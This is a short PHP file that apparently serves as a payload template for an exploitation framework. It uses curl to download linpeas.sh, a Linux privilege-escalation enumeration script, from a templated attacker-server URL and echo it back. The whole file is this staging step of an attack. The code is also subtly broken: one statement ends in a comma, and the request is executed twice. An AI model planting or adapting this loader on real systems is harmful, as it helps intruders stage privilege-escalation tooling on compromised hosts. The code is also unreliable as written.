<?php

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "{{datastore.srvhost_url}}linpeas.sh"),
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    if(curl_exec($ch) === FALSE) {
         echo "Error: " . curl_error($ch);
    } else {
         echo curl_exec($ch);
    }

    curl_close($ch);

?>
